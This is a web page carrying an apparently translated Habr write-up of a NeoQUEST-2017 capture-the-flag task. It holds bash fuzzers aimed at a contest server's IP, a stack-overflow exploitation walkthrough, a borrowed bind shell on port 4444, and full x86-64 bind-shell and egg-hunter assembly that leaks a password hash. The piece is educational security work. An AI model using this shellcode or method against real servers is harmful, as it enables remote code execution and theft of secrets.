<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Search for vulnerability using fuzzing and shellcode development for its operation.</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="To search for vulnerabilities all means are good, but what is good with fuzzing ? The answer is simple: in that it provides an opportunity to check ho...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Search for vulnerability using fuzzing and shellcode development for its operation.</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/e9d/d68/60d/e9dd6860d8e04b8db5b89b2dacd07ef6.jpg" align="left">  To search for vulnerabilities all means are good, but what is good with <a href="http://www.vr-online.ru/%3Fq%3Dcontent/fuzzing-tehnologija-ohoty-za-bagami-752">fuzzing</a> ?  The answer is simple: in that it provides an opportunity to check how a program behaves, receiving information that is known to be incorrect (and often even random), which are not always included in many developer tests. <br><br>  Incorrect termination of the program during the fuzzing suggests that there is a vulnerability. <br><br>  In this article we: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <ul><li>  <b>demonstrate how to fuzz a <a href="http://www.json.org/json-ru.html">JSON</a> request handler;</b> </li><li>  <b>using fuzzing, find the buffer overflow vulnerability;</b> </li><li>  <b>We'll write the shellcode in Assembler to exploit the found vulnerability.</b> </li></ul><br>  We will <a href="http://neoquest.ru/timeline.php%3Fyear%3D2017%26part%3D1">analyze</a> on the example of the initial data the tasks of the past <a href="http://neoquest.ru/timeline.php%3Fyear%3D2017%26part%3D1">NeoQUEST</a> .  A 64-bit Linux server is known to handle JSON requests that end with a <a href="https://ru.wikipedia.org/wiki/%25D0%259D%25D1%2583%25D0%25BB%25D1%258C-%25D1%2582%25D0%25B5%25D1%2580%25D0%25BC%25D0%25B8%25D0%25BD%25D0%25B8%25D1%2580%25D0%25BE%25D0%25B2%25D0%25B0%25D0%25BD%25D0%25BD%25D0%25B0%25D1%258F_%25D1%2581%25D1%2582%25D1%2580%25D0%25BE%25D0%25BA%25D0%25B0">null terminator</a> (a character with a code of 0).  To get the key, you need to send a request with the correct password, while there is no access to the source codes and the binary of the server process, only the IP address and port are given.  The legend to the task also indicated that the MD5 hash of the correct password is contained somewhere in the process memory after the following 5 characters: ‚Äúhash:‚Äù.  And in order to remove the password from the process memory, the possibility of remote code execution is necessary. <br><a name="habracut"></a><br><br><h2>  <b>"Feel" port</b> </h2><br>  We try connection to the specified address and port.  To do this, we use the well-known <a href="http://handynotes.ru/2010/01/unix-utility-netcat.html">netcat</a> utility - the ‚ÄúSwiss knife‚Äù for working with the network.  Do not forget about the terminating null terminator in the query: <br><br><img src="https://habrastorage.org/files/e95/397/6c7/e953976c72644ccc8a4b5a51cb042d80.png"><br><br>  By the nature of the received response, we understand what input the server process expects.  It really handles bare JSON requests without headers or other extraneous characters.  Let's specify which JSON requests the server considers valid from the syntax point of view: <br><br><img src="https://habrastorage.org/files/330/7cb/61e/3307cb61eb604e34b4041f6ec59fcbf6.png"><br><br>  Judging by these server responses, it recognizes integers as values, but does not recognize boolean values. <br><br><img src="https://habrastorage.org/files/61f/bd0/63c/61fbd063c9204ace8e4e2ed9345aa1c4.png"><br><br>  These server responses indicate that it recognizes non-empty arrays as values. <br><br><img src="https://habrastorage.org/files/5a6/348/c60/5a6348c60b804103b33bfba9d7e5198f.png"><br><br>  The server recognizes associative arrays nested in each other and ordinary arrays, but, again, non-empty. <br><br>  If the request format is correctly recognized, the server checks for the presence of the ‚Äúpass‚Äù tag in the main associative array: <br><br><img src="https://habrastorage.org/files/aa7/005/1a6/aa70051a6bad40e695390a2bb63a3ac8.png"><br><br>  If there is such a tag, its value is checked and, apparently, its hash is checked against the value in memory. <br><br>  How to get the correct password value?  You can try a simple brute force field with a password in the requests.  However, such a primitive attack did not produce results. <br><br>  Well, let's try to search for a vulnerability in the request handler, the exploitation of which will allow to execute the necessary shellcode and get the password hash. <br><br><h2>  <b>Use fuzzing!</b> </h2><br>  The only source of information is server responses to our requests.  In the absence of a binary code and source codes, we use fuzzing.  In more detail about the approach to testing we read <a href="http://www.slideshare.net/VLDCORP/fuzz">here</a> and <a href="https://xakep.ru/2011/05/30/55559/">there</a> , and we learn that there are two main fuzzing methods: <br><br><ol><li>  Data generation </li><li>  Data mutation. </li></ol><br>  You can generate random data (this approach is often called dumb-fuzzing) or input data generated in accordance with the models (smart fuzzing).  Mutation provides a modification of existing input data. <br><br>  We will use data generation and iterate through all potential bottlenecks of the JSON format to find input requests for which the server‚Äôs response differs from the usual one. <br><br>  We will conduct the check in several stages: <br><ol><li>  Replacing service characters of a valid request with incorrect ones. </li><li>  Let's make a big level of nesting of objects and JSON lists into each other. </li><li>  We will form queries in which something is ‚Äúmany‚Äù (long strings in keys and values, objects with a large number of key-value pairs, long lists). </li></ol><br><h4>  <b>1. Replacing service characters of a valid request with incorrect ones</b> </h4><br>  Service characters - brackets, commas, colon, delimiters (spaces).  Due to this, the structure of the correct query will be violated in different places.  An example of such a fuzzer: <br><br><pre><code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash #correct query base='{"example" : {"innerobj" : "someval"}, "example" : 777777777, "example" : [1, [2, {"inlist" : "val"}], 3], "end" : "543"}' ad1='Access Denied, pass tag not found in JSON..' ad2='Exit code = 0' if1='Incorrect data format! Check your JSON syntax.' if2='Exit code = 1' #what we must replace in correct base query declare -a checkable_syms=('[' ']' '{' '}' ' ' ':' ',') #bad substitution symbols to replace with declare -a arr=(" " "]" "{" "[[" "}}" ":" "," "A" "1" ";") echo "Fuzzing maintenance symbols.." for symbol in "${checkable_syms[@]}" do #how manu occurencies of symbol in base string? num=$(($(echo $base | awk "BEGIN{FS=\"[$symbol]\"} {print NF}") - 1)) #check every position of symbol for i in $(seq 1 $num) do #trying all of the "bad" substitutions for bad_sym in "${arr[@]}" do #dont bring if [[ "$bad_sym" != "$symbol" ]]; then #constructing the query to server resp=`echo -e "$base\x00" | sed "s/[$symbol]/$bad_sym/$i" | nc 213.170.91.86 8887` #checking the answer, if not standart, something happened [[ (("$resp" =~ "$if1" &amp;&amp; "$resp" =~ "$if2")) || (("$resp" =~ "$ad1" &amp;&amp; "$resp" =~ "$ad2")) ]] || echo $resp fi done done done</span></span></code> </pre> <br><img src="https://habrastorage.org/files/d21/aac/d32/d21aacd3220f419ca93d89f624c9fe1e.png"><br><br>  Such a test did not give results.  So, we will check other cases. <br><br><h4>  <b>2. Check for a large nesting level of objects and JSON lists in each other</b> </h4><br>  An example of a fuzzer to test: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash #how many nested objects N=1024 base='"{\"example\" : "' final='"{\"innerobj\" : \"someval\"}"' ad1='Access Denied, pass tag not found in JSON..' ad2='Exit code = 0' if1='Incorrect data format! Check your JSON syntax.' if2='Exit code = 1' echo "Fuzzing nested objects.." for i in $(seq 1 $N) do #constructing the query to server with nested object que="$base*$i + $final + \"}\"*$i + \"\x00\"" pyt="print($que);" resp=`python -c "$pyt" | nc 213.170.91.86 8887` #checking the answer, if not standart, something happened [[ (("$resp" =~ "$ad1" &amp;&amp; "$resp" =~ "$ad2")) ]] || echo $resp Done</span></span></code> </pre><br><img src="https://habrastorage.org/files/94d/d4c/dd7/94dd4cdd7e9240f48d2a01ccd6d552e1.png"><br><br>  Again the server correctly processes all requests.  Similarly, lists of large nesting are checked.  Their server also handles correctly.  We will check on! <br><br><h4>  <b>3. Check for requests in which something is ‚Äúmany‚Äù</b> </h4><br>  Check long strings in keys and values, objects with a large number of key-value pairs, long lists. <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash #how many nested objects N=2048 base1='{\"example' letter='A' final1='\": \"example\"}' base2='{\"example\" : \"example' final2='\"}' ad1='Access Denied, pass tag not found in JSON..' ad2='Exit code = 0' if1='Incorrect data format! Check your JSON syntax.' if2='Exit code = 1' flag=0 echo "Fuzzing long strings.." for i in $(seq 1 $N) do #checking long string key or value if [[ "$flag" == 0 ]]; then base=$base1 final=$final1 flag=1 else base=$base2 final=$final2 flag=0 fi que="\"$base\" + (\"$letter\")*$i + \"$final\" + \"\x00\"" pyt="print($que);" resp=`python -c "$pyt" | nc 213.170.91.86 8887` #checking the answer, if not standart, something happened [[ (("$resp" =~ "$ad1" &amp;&amp; "$resp" =~ "$ad2")) ]] || echo $resp done</span></span></code> </pre><br><img src="https://habrastorage.org/files/457/2a8/cc7/4572a8cc76fe4ccc88aa5c3ce726784b.png"><br><br>  As you can see, long lines are handled normally.  Long listings too.  What about long objects? <br><br>  Example of fuzzer: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash #how many pairs in resulting object N=260 head='{' block='\"example\" : \"val\", ' final='\"last\" : \"block\"}' ad1='Access Denied, pass tag not found in JSON..' ad2='Exit code = 0' if1='Incorrect data format! Check your JSON syntax.' if2='Exit code = 1' echo "Fuzzing long objects.." for i in $(seq 1 $N) do #constructing long object que="\"$head\" + (\"$block\")*$i + \"$final\" + \"\x00\"" pyt="print($que);" resp=`python -c "$pyt" | nc 213.170.91.86 8887` #checking the answer, if not standart, something happened [[ (("$resp" =~ "$if1" &amp;&amp; "$resp" =~ "$if2")) || (("$resp" =~ "$ad1" &amp;&amp; "$resp" =~ "$ad2")) ]] || echo $resp done</span></span></code> </pre><br><img src="https://habrastorage.org/files/662/cf2/f1a/662cf2f1a5164fbfa960139262fdca32.png"><br><br>  Here it is!  If the object is long enough, the server response is incomplete - no exit code is issued to the user  This starts to occur when the object contains more than 257 key-value pairs.  If we make their number even more, we will see that the answer does not come at all: <br><br><img src="https://habrastorage.org/files/41e/710/6c9/41e7106c943c4c479721ebb6caeb3c14.png"><br><br>  Apparently, we have a classic buffer overflow.  When parsing an input request, key-value pairs are placed in a constant buffer on the stack without first checking their number in the request. <br><br>  At the same time, if the number of pairs lies in the range from 257 to 281, the return address is triturated from the request handler function, and if there are more than 281, some local variables are probably rewritten beyond the return address.  This leads to the fact that the first part of the error message does not reach the user. <br><br>  Vulnerability found! <br><br><h2>  <b>Exploiting the vulnerability</b> </h2><br>  To complete the task and get the coveted token, you need to understand how the return address is ground.  It is logical to assume that the lines themselves (the keys and values ‚Äã‚Äãof the object in the request), but pointers to them, are sequentially added to the stack.  If so, you can not worry about the placement of shellcode in the memory and transfer of control to it.  <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> also in this case ceases to be a hindrance. <br><br>  <a href="https://ru.wikipedia.org/wiki/%25D0%259F%25D1%2580%25D0%25B5%25D0%25B4%25D0%25BE%25D1%2582%25D0%25B2%25D1%2580%25D0%25B0%25D1%2589%25D0%25B5%25D0%25BD%25D0%25B8%25D0%25B5_%25D0%25B2%25D1%258B%25D0%25BF%25D0%25BE%25D0%25BB%25D0%25BD%25D0%25B5%25D0%25BD%25D0%25B8%25D1%258F_%25D0%25B4%25D0%25B0%25D0%25BD%25D0%25BD%25D1%258B%25D1%2585">DEP</a> can badly ruin our lives, because memory for lines is allocated in a heap.  But let's not rush to conclusions and test our ideas in practice.  To do this, we take some verification shellcode for our platform in order to understand whether the heap memory is running on the server process? <br><br>  To do this, take an ordinary bindshell on port 4444 <a href="http://shell-storm.org/">from here</a> : <br><br><img src="https://habrastorage.org/files/d45/aa5/b3b/d45aa5b3b13043d099930e171380e1d9.png"><br><br>  Since we have no information about the exact size of the buffer, the presence of other local variables, memory alignment on the stack, etc., it is necessary to place the shellcode a bit with a margin.  Place it in four values ‚Äã‚Äãfor pairs after 256 preceding them: <br><br><img src="https://habrastorage.org/files/f9f/b3a/891/f9fb3a8916344247914e7f3ce281e367.png"><br><br>  Hooray, everything works!  The memory with the shellcode is executable, and the return address from the request handler function is overwritten by the pointer to the line with the shellcode automatically.  We have a remote shell on the server.  Let's try to develop success and get access to the binary code JSON-processor: <br><br><img src="https://habrastorage.org/files/1b1/af9/98d/1b1af998de1b4b0fb54b5560a7164a99.png"><br><br>  Alas, not enough rights to do anything worthwhile.  It seems that the server handler binary is encrypted, and without this password you cannot access the binary code. <br><br><h2>  <b>We write the shellcode and get the token</b> </h2><br>  Despair early.  Recall that in this case our goal is not a binary as such, but a value in the memory of the process / neoquest / vuln. <br><br>  Knowing that the binary file is encrypted, and that bindshell replaces the current server process in memory with the bash process, let's go another way.  Let's write your <a href="https://xakep.ru/2011/01/12/54471/">egg hunt shellcode</a> , which will find the desired value in the process's memory according to the well-known prefix (‚Äúhash:‚Äù) and give it to the user. <br><br>  A variant of our shellcode (long!) Under the spoiler: <br><br><div class="spoiler">  <b class="spoiler_title">Shellcode</b> <div class="spoiler_text"><pre> <code class="hljs perl"><span class="hljs-keyword"><span class="hljs-keyword">xor</span></span> eax,eax <span class="hljs-keyword"><span class="hljs-keyword">xor</span></span> ebx,ebx <span class="hljs-keyword"><span class="hljs-keyword">xor</span></span> edx,edx ;<span class="hljs-keyword"><span class="hljs-keyword">socket</span></span> create <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span> mov al,<span class="hljs-number"><span class="hljs-number">0x1</span></span> mov esi,eax inc al mov edi,eax mov dl,<span class="hljs-number"><span class="hljs-number">0x6</span></span> mov al,<span class="hljs-number"><span class="hljs-number">0x29</span></span> <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span> ;store the server sock xchg ebx,eax ;<span class="hljs-keyword"><span class="hljs-keyword">bind</span></span> on port <span class="hljs-number"><span class="hljs-number">4444</span></span> <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span> <span class="hljs-keyword"><span class="hljs-keyword">xor</span></span> rax,rax <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> rax <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> <span class="hljs-number"><span class="hljs-number">0x5c110102</span></span> mov [rsp+<span class="hljs-number"><span class="hljs-number">1</span></span>],al mov rsi,rsp mov dl,<span class="hljs-number"><span class="hljs-number">0x10</span></span> mov edi,ebx mov al,<span class="hljs-number"><span class="hljs-number">0x31</span></span> <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span> ;<span class="hljs-keyword"><span class="hljs-keyword">listen</span></span> <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span> mov al,<span class="hljs-number"><span class="hljs-number">0x5</span></span> mov esi,eax mov edi,ebx mov al,<span class="hljs-number"><span class="hljs-number">0x32</span></span> <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span> ;<span class="hljs-keyword"><span class="hljs-keyword">accept</span></span> connection <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span> <span class="hljs-keyword"><span class="hljs-keyword">xor</span></span> edx,edx <span class="hljs-keyword"><span class="hljs-keyword">xor</span></span> esi,esi mov edi,ebx mov al,<span class="hljs-number"><span class="hljs-number">0x2b</span></span> <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span> ;store <span class="hljs-keyword"><span class="hljs-keyword">socket</span></span> mov edi,eax ;dup2 syscalls - <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> printing result to client <span class="hljs-keyword"><span class="hljs-keyword">xor</span></span> rax,rax mov esi,eax mov al,<span class="hljs-number"><span class="hljs-number">0x21</span></span> <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span> inc al mov esi,eax mov al,<span class="hljs-number"><span class="hljs-number">0x21</span></span> <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span> inc al mov esi,eax mov al,<span class="hljs-number"><span class="hljs-number">0x21</span></span> <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span> ;egg hunter <span class="hljs-keyword"><span class="hljs-keyword">xor</span></span> rsi, rsi ; Some prep junk. <span class="hljs-keyword"><span class="hljs-keyword">xor</span></span> rdi, rdi <span class="hljs-keyword"><span class="hljs-keyword">xor</span></span> rbx, rbx add bl, <span class="hljs-number"><span class="hljs-number">5</span></span> go_end_of_page: <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> di, <span class="hljs-number"><span class="hljs-number">0x0fff</span></span> ; We align with a page size of <span class="hljs-number"><span class="hljs-number">0x1000</span></span> next_byte: mov cx, di cmp cl, <span class="hljs-number"><span class="hljs-number">0xff</span></span> ; <span class="hljs-keyword"><span class="hljs-keyword">next</span></span> byte offset jne cmps inc rdi <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> <span class="hljs-number"><span class="hljs-number">21</span></span> <span class="hljs-keyword"><span class="hljs-keyword">pop</span></span> rax ; We load access() in RAX ; <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> rdx ; <span class="hljs-keyword"><span class="hljs-keyword">pop</span></span> rdi mov rdx, rdi add rdi, rbx ; We need to be sure <span class="hljs-keyword"><span class="hljs-keyword">our</span></span> <span class="hljs-number"><span class="hljs-number">5</span></span> byte egg check does <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> span across <span class="hljs-number"><span class="hljs-number">2</span></span> pages <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span> ; <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span> to access() cmp al, <span class="hljs-number"><span class="hljs-number">0xf2</span></span> ; Checks <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> EFAULT. EFAULT indicates bad page access. je go_end_of_page jmp cmps2 cmps: inc rdi cmps2: cmp [rdi - <span class="hljs-number"><span class="hljs-number">4</span></span>] , dword <span class="hljs-number"><span class="hljs-number">0x3a687361</span></span> ;ash: letters jne next_byte cmp [rdi - <span class="hljs-number"><span class="hljs-number">5</span></span>] , dword <span class="hljs-number"><span class="hljs-number">0x68736168</span></span> ;hash letters jne next_byte after: ;<span class="hljs-keyword"><span class="hljs-keyword">printf</span></span> <span class="hljs-number"><span class="hljs-number">32</span></span> byte of MD5-hash <span class="hljs-keyword"><span class="hljs-keyword">xor</span></span> rax, rax add rax, <span class="hljs-number"><span class="hljs-number">1</span></span> mov rsi, rdi <span class="hljs-keyword"><span class="hljs-keyword">xor</span></span> rdi, rdi add rdi, <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">xor</span></span> rdx, rdx mov dl, <span class="hljs-number"><span class="hljs-number">0x20</span></span> ; Size of <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span> ;<span class="hljs-keyword"><span class="hljs-keyword">exit</span></span> <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span> <span class="hljs-keyword"><span class="hljs-keyword">xor</span></span> rax, rax add rax, <span class="hljs-number"><span class="hljs-number">0x3b</span></span> <span class="hljs-keyword"><span class="hljs-keyword">xor</span></span> rdi, rdi <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span></code> </pre><br></div></div><br>  What this shellcode does: <br><br><ul><li>  Creates a socket, bolts to the desired port (bind 4444), waits for a connection (listen). </li><li>  Accepts a connection, saves a client socket for later use (accept). </li><li>  It copies STDIN, STDOUT, STDERR descriptors to the client socket for issuing the result (dup2). </li><li>  Bypasses the memory page by page (4Kb).  If the address is mapped into the address space of the process, we move along the page in search of the 5-character prefix "hash:".  If the address is not displayed, go to the next page.  Address verification is performed by access call system. </li><li>  The found address is used for output to the client socket 32 ‚Äã‚Äãbytes of memory after it - there must be the required password hash (system call write). </li><li>  Exits work. </li></ul><br>  Shellcode was written, now let's test our solution: <br><br><img src="https://habrastorage.org/files/0bc/bc6/a0f/0bcbc6a0fe024d2fa7ce697fca8b1462.png"><br><br>  It worked!  When connecting to port 4444, we see the required 32 characters of the password hash.  It remains to get the password.  Use Google: <br><br><img src="https://habrastorage.org/files/d33/751/eef/d33751eef7794666b03b9bc64e607213.png"><br><br>  Required password: ABAB865A15B15538D81C066574449597.  It remains to get the coveted token: <br><br><img src="https://habrastorage.org/files/56d/647/eba/56d647eba46648348c64ac3da415319e.png"><br><br>  Searched token: 795944475660c18d83551b51a568baba <br><br><h2>  <b>Advantages and disadvantages of fuzzing</b> </h2><br>  A wide variety of possible entry points (a text string entered via GUI, binary data from a file, the value of a network request field) and application under test (you can fuzz files, protocols, drivers, web applications, sources ...) makes fuzzing a rather effective approach to troubleshooting code security issues. <br><br>  In this article, we demonstrated a fairly simple example of fuzzing, in which the mutation of the generated test data was minimized, but modern fuzzers ( <a href="http://www.peachfuzzer.com/">Peach</a> , <a href="https://github.com/OpenRCE/sulley">Sulley</a> , <a href="http://hotfuzz.sourceforge.net/">HotFuzz,</a> and others) have much richer functionality, implementing many mutation algorithms. <br><br>  However, the approach to testing with the fuzzing method has a quite obvious disadvantage: since the fuzzer does not have knowledge of the internal structure of the program being tested, you will have to search through a huge number of test data options to look for security issues.  And this, in turn, requires considerable time. <br><br><h2>  <b>And on NeoQUEST-2017 - even more interesting tasks!</b> </h2><br>  While practicing the NeoQUEST missions, you can always learn something new and understand how certain security mechanisms work in practice.  In this article, we told about fuzzing, demonstrated how to detect the buffer overflow vulnerability by this method, and wrote the shellcode for the found vulnerability in Assembler.  At the same time, we executed our code without even having a binary program vulnerable.  This is a clear demonstration of what might be if the server is poorly implemented. <br><br>  In the tasks NeoQUEST-2017, which will be held from March 1 to 10, undoubtedly, there will also be something to learn, so feel free to <a href="https://2017.neoquest.ru/">register</a> ! </div><p>Source: <a href="https://habr.com/ru/post/321912/">https://habr.com/ru/post/321912/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../321902/index.html">Vim and switch layouts: about sore</a></li>
<li><a href="../321904/index.html">14 tips on using Sketch and InVision in the work of the designer</a></li>
<li><a href="../321906/index.html">Broadcast TensorFlow Developer Summit</a></li>
<li><a href="../321908/index.html">Juniper offers BTI hardware</a></li>
<li><a href="../321910/index.html">Upgrading a Home Stand or ‚ÄúHow to Overcome Realtek 8168 Gigabit Ethernet‚Äù in vSphere 6.5</a></li>
<li><a href="../321914/index.html">The report on the results of "My Circle" for January 2017 and the most popular vacancies of the month</a></li>
<li><a href="../321916/index.html">Network Security Status 2016, Qrator Labs and Wallarm Detailed Report</a></li>
<li><a href="../321918/index.html">Data is better than oil, or the sixth set per program by big data</a></li>
<li><a href="../321920/index.html">Nutanix AOS 5.0 - Big Update</a></li>
<li><a href="../321922/index.html">How to make your games for free? T3 indie games development guide</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>